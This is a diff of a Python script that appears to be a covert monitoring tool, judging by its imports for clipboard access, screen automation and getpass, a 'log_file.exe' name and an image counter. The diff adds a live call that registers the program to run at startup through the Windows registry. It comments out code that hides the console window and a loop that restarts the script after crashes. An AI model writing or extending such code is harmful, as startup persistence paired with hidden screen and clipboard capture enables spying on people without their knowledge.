@@ -16,32 +16,32 @@ import getpass
 # from pip import main
 import pyperclip
 import pyautogui
-import ctypes
+# import ctypes
 import autorun
-import win32process
+# import win32process
 import  shutil
-import logging
+# import logging
 
-def start_script():
-    try:
-        main_func()
-    except:
+autorun.AddToRegistry()
+
+# def start_script():
+#     try:
+#         main_func()
+#     except:
         
-        handle_crash()
+#         handle_crash()
 
-def handle_crash():
-    time.sleep(5) 
-    start_script()
+# def handle_crash():
+#     time.sleep(5) 
+#     start_script()
 
-    
 
-autorun.AddToRegistry('log_file.exe')
 
-hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-if hwnd != 0:      
-    ctypes.windll.user32.ShowWindow(hwnd, 0)      
-    ctypes.windll.kernel32.CloseHandle(hwnd)
-    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+# if hwnd != 0:      
+#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
+#     ctypes.windll.kernel32.CloseHandle(hwnd)
+#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 print('program started')
 img_count = 1
@@ -252,7 +252,7 @@ def main_func():
 try:
     # printf("GeeksforGeeks")
     
-    start_script()
+    main_func()
 except Exception as Argument:
  
     # creating/opening a file
@@ -263,9 +263,7 @@ except Exception as Argument:
     
     # closing the file
     f.close()
-    start_script()
-except:
-    start_script()
+    main_func()
     
 
 
